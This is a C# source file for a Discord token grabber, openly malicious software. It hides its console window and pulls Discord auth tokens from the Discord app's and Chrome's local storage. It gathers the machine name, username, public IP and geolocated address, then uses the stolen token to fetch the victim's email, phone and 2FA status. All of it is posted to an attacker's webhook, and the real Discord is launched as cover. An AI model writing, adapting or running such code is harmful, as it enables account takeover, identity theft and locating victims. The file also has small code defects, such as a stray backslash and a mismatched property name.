using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Web;
using System.Security.Cryptography;

namespace DiscordTokenGrabber
{
    class Program
    {
        private static readonly string WebhookUrl = "YOUR_WEBHOOK_URL_HERE";
        
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        
        static async Task Main(string[] args)
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            
            try
            {
                var tokenData = await CollectDiscordTokens();
                
                var systemInfo = CollectSystemInfo();
                
                var locationInfo = await GetLocationFromIP(systemInfo.PublicIP);
                
                var accountInfo = await GetAccountInfo(tokenData.Token);
                
                await SendToWebhook(tokenData, systemInfo, locationInfo, accountInfo);
                
                StartOriginalDiscord();
                
                Environment.Exit(0);
            }
            catch (Exception ex)
            {
                Environment.Exit(0);
            }
        }
        
        static async Task<TokenData> CollectDiscordTokens()
        {
            var tokenData = new TokenData();
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            
            string discordPath = Path.Combine(appData, "discord", "Local Storage", "leveldb");
            
            if (Directory.Exists(discordPath))
            {
                string[] files = Directory.GetFiles(discordPath, "*.ldb");
                
                foreach (string file in files)
                {
                    string content = File.ReadAllText(file);
                    
                    int tokenIndex = content.IndexOf("\"token\":");
                    if (tokenIndex > -1)
                    {
                        int startIndex = tokenIndex + 8;
                        int endIndex = content.IndexOf("\"", startIndex);
                        if (endIndex > startIndex)
                        {
                            tokenData.Token = content.Substring(startIndex, endIndex - startIndex);
                            tokenData.Source = "Discord App";
                            break;
                        }
                    }
                }
            }
            
            if (string.IsNullOrEmpty(tokenData.Token))
            {
                string chromePath = Path.Combine(appData, "..", "Local", "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb");
                
                if (Directory.Exists(chromePath))
                {
                    string[] files = Directory.GetFiles(chromePath, "*.ldb");
                    
                    foreach (string file in files)
                    {
                        string content = File.ReadAllText(file);
                        
                        int tokenIndex = content.IndexOf("\"token\":");
                        if (tokenIndex > -1)
                        {
                            int startIndex = tokenIndex + 8;
                            int endIndex = content.IndexOf("\"", startIndex);
                            if (endIndex > startIndex)
                            {
                                tokenData.Token = content.Substring(startIndex, endIndex - startIndex);
                                tokenData.Source = "Chrome";
                                break;
                            }
                        }
                    }
                }
            }
            
            return tokenData;
        }
        
        static SystemInfo CollectSystemInfo()
        {
            var info = new SystemInfo();
            
            info.PCName = Environment.MachineName;
            
            info.Username = Environment.UserName;
            
            try
            {
                string externalIP = new WebClient().DownloadString("https://api.ipify.org");
                info.PublicIP = externalIP.Trim();
            }
            catch
            {
                info.PublicIP = "不明";
            }
            
            info.OS = Environment.OSVersion.ToString();
            
            return info;
        }
        
        static async Task<LocationInfo> GetLocationFromIP(string ipAddress)
        {
            var locationInfo = new LocationInfo();
            
            try
            {
                string url = $"http://ip-api.com/json/{ipAddress}";
                string response = await new WebClient().DownloadStringTaskAsync(url);
                
                var locationData = JsonSerializer.Deserialize<IPApiResponse>(response);
                
                if (locationData.Status == "success")
                {
                    locationInfo.Country = locationData.Country;
                    locationInfo.Region = locationData.RegionName;
                    locationInfo.City = locationData.City;
                    locationInfo.Lat = locationData.Lat;
                    locationInfo.Lon = locationData.Lon;
                    locationInfo.Zip = locationData.Zip;
                    locationInfo.Isp = locationData.Isp;
                    
                    locationInfo.FullAddress = $"{locationData.Zip} {locationData.Country} {locationData.RegionName} {locationData.City}";
                }
            }
            catch
            {
                locationInfo.FullAddress = "住所情報取得不可";
            }
            
            return locationInfo;
        }
        
        static async Task<AccountInfo> GetAccountInfo(string token)
        {
            var accountInfo = new AccountInfo();
            
            try
            {
                using (var client = new WebClient())
                {
                    client.Headers.Add("Authorization", token);
                    string response = await client.DownloadStringTaskAsync("https://discord.com/api/v9/users/@me");
                    
                    var userData = JsonSerializer.Deserialize<UserData>(response);
                    
                    accountInfo.Username = userData.Username;
                    accountInfo.Discriminator = userData.Discriminator;
                    accountInfo.ID = userData.ID;
                    accountInfo.Email = userData.Email;
                    accountInfo.Phone = userData.Phone;
                    accountInfo.Verified = userData.Verified;
                    
                    accountInfo.MFAEnabled = userData.MFAEnabled;
                    
                    if (userData.MFAEnabled)
                    {
                        try
                        {
                            string backupCodesResponse = await client.DownloadStringTaskAsync("https://discord.com/api/v9/users/@me/mfa/codes");
                            accountInfo.HasBackupCodes = !string.IsNullOrEmpty(backupCodesResponse);
                        }
                        catch
                        {
                            accountInfo.HasBackupCodes = false;
                        }
                    }
                }
            }
            catch
            {
                
            }
            
            return accountInfo;
        }
        
        static async Task SendToWebhook(TokenData tokenData, SystemInfo systemInfo, LocationInfo locationInfo, AccountInfo accountInfo)
        {
            if (string.IsNullOrEmpty(WebhookUrl) || WebhookUrl == "YOUR_WEBHOOK_URL_HERE")
            {
                return;
            }
            
            if (string.IsNullOrEmpty(tokenData.Token))
            {
                return;
            }
            
            var payload = new
            {
                username = "Token Grabber",
                embeds = new[]
                {
                    new
                    {
                        title = "new user",
                        color = 242929,
                        fields = new[]
                        {
                            new { name = "token", value = $"```\n{tokenData.Token}\n```", inline = false },
                            new { name = "ユーザー名", value = \$"{accountInfo.Username}#{accountInfo.Discriminator}", inline = true },
                            new { name = "ユーザーID", value = accountInfo.ID, inline = true },
                            new { name = "mail", value = accountInfo.Email, inline = true },
                            new { name = "sms", value = accountInfo.Phone ?? "none", inline = true },
                            new { name = "2FA", value = accountInfo.MFAEnabled ? "true" : "false", inline = true },
                            new { name = "backupcode", value = accountInfo.HasBackupCodes ? "true" : "false", inline = true },
                            new { name = "PC", value = systemInfo.PCName, inline = true },
                            new { name = "IPv4", value = systemInfo.PublicIP, inline = true },
                            new { name = "国", value = locationInfo.Country, inline = true },
                            new { name = "地域", value = locationInfo.Region, inline = true },
                            new { name = "都市", value = locationInfo.City, inline = true },
                            new { name = "郵便番号", value = locationInfo.Zip, inline = true },
                            new { name = "ISP", value = locationInfo.Isp, inline = true },
                            new { name = "住所", value = locationInfo.FullAddress, inline = false },
                            new { name = "OS", value = systemInfo.OS, inline = true },
                            new { name = "トークンソース", value = tokenData.Source, inline = true }
                        }
                    }
                }
            };
            
            string jsonPayload = JsonSerializer.Serialize(payload);
            byte[] byteArray = Encoding.UTF8.GetBytes(jsonPayload);
            
            using (var client = new WebClient())
            {
                client.Headers.Add("Content-Type", "application/json");
                await client.UploadDataTaskAsync(new Uri(WebhookUrl), "POST", byteArray);
            }
        }
        
        static void StartOriginalDiscord()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string discordPath = Path.Combine(appData, "..", "Local", "Discord", "app-1.0.9007", "Discord.exe");
                
                if (!File.Exists(discordPath))
                {
                    string discordDir = Path.Combine(appData, "..", "Local", "Discord");
                    if (Directory.Exists(discordDir))
                    {
                        var versionDirs = Directory.GetDirectories(discordDir, "app-*");
                        if (versionDirs.Length > 0)
                        {
                            discordPath = Path.Combine(versionDirs[0], "Discord.exe");
                        }
                    }
                }
                
                if (File.Exists(discordPath))
                {
                    Process.Start(discordPath);
                }
            }
            catch
            {
                
            }
        }
    }
    
    class TokenData
    {
        public string Token { get; set; }
        public string Source { get; set; }
    }
    
    class SystemInfo
    {
        public string PCName { get; set; }
        public string Username { get; set; }
        public string PublicIP { get; set; }
        public string OS { get; set; }
    }
    
    class LocationInfo
    {
        public string Country { get; set; }
        public string Region { get; set; }
        public string City { get; set; }
        public string Zip { get; set; }
        public string ISP { get; set; }
        public string FullAddress { get; set; }
        public double Lat { get; set; }
        public double Lon { get; set; }
    }
    
    class AccountInfo
    {
        public string Username { get; set; }
        public string Discriminator { get; set; }
        public string ID { get; set; }
        public string Email { get; set; }
        public string Phone { get; set; }
        public bool Verified { get; set; }
        public bool MFAEnabled { get; set; }
        public bool HasBackupCodes { get; set; }
    }
    
    class IPApiResponse
    {
        public string Status { get; set; }
        public string Country { get; set; }
        public string RegionName { get; set; }
        public string City { get; set; }
        public string Zip { get; set; }
        public string Isp { get; set; }
        public double Lat { get; set; }
        public double Lon { get; set; }
    }
    
    class UserData
    {
        public string ID { get; set; }
        public string Username { get; set; }
        public string Discriminator { get; set; }
        public string Email { get; set; }
        public string Phone { get; set; }
        public bool Verified { get; set; }
        public bool MFAEnabled { get; set; }
    }
}
